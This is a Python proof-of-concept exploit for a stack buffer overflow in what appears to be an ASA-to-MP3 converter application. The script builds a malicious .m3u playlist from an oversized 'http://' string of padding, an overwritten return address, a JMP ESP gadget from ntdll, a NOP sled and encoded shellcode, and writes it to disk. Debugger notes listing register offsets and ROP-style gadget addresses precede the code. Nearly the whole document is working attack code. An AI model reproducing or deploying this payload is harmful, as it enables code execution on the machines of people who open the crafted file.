
#   000DC5B8   69697647  Gvii   eip     2417
#   000DC5C0   4E4C494C  LILN   esp     2425

#   7C91FCD8   FFE4             JMP ESP  ntdll

#   77C35459   54               PUSH ESP
#   77C3545A   C3               RETN

#   kernel32.dll
#   7C88018B   58               POP EAX
#   7C88018C   5D               POP EBP
#   7C88018D   C3               RETN


junk = 'http://'
junk += 'A'*17417

pattern = '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'
#7C91FCD8
eip = '\x8B\x01\x88\x7C'
space = 'A'*4
nops = '\x90'*8

#7C91FCD8 
jmp_esp = '\xD8\xFC\x91\x7C'
shellcode = '\xcc'*4
shellcode += '\x90'*30
shellcode += ("\xbb\x83\xb3\x46\x48\xdd\xc3\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x31\x31\x58\x13\x83\xc0\x04\x03\x58\x8c\x51\xb3\xb4\x7a\x17"
"\x3c\x45\x7a\x78\xb4\xa0\x4b\xb8\xa2\xa1\xfb\x08\xa0\xe4\xf7"
"\xe3\xe4\x1c\x8c\x86\x20\x12\x25\x2c\x17\x1d\xb6\x1d\x6b\x3c"
"\x34\x5c\xb8\x9e\x05\xaf\xcd\xdf\x42\xd2\x3c\x8d\x1b\x98\x93"
"\x22\x28\xd4\x2f\xc8\x62\xf8\x37\x2d\x32\xfb\x16\xe0\x49\xa2"
"\xb8\x02\x9e\xde\xf0\x1c\xc3\xdb\x4b\x96\x37\x97\x4d\x7e\x06"
"\x58\xe1\xbf\xa7\xab\xfb\xf8\x0f\x54\x8e\xf0\x6c\xe9\x89\xc6"
"\x0f\x35\x1f\xdd\xb7\xbe\x87\x39\x46\x12\x51\xc9\x44\xdf\x15"
"\x95\x48\xde\xfa\xad\x74\x6b\xfd\x61\xfd\x2f\xda\xa5\xa6\xf4"
"\x43\xff\x02\x5a\x7b\x1f\xed\x03\xd9\x6b\x03\x57\x50\x36\x49"
"\xa6\xe6\x4c\x3f\xa8\xf8\x4e\x6f\xc1\xc9\xc5\xe0\x96\xd5\x0f"
"\x45\x68\x9c\x12\xef\xe1\x79\xc7\xb2\x6f\x7a\x3d\xf0\x89\xf9"
"\xb4\x88\x6d\xe1\xbc\x8d\x2a\xa5\x2d\xff\x23\x40\x52\xac\x44"
"\x41\x31\x33\xd7\x09\x98\xd6\x5f\xab\xe4")

junk2 = 'A'*200

payload = junk + eip + space + nops +  jmp_esp + shellcode + junk2

payload = payload.encode('raw_unicode_escape')

f = open('./asatomp3converter_bof.m3u','wb')
f.write(payload)
print("payload written successfully")

f.close()


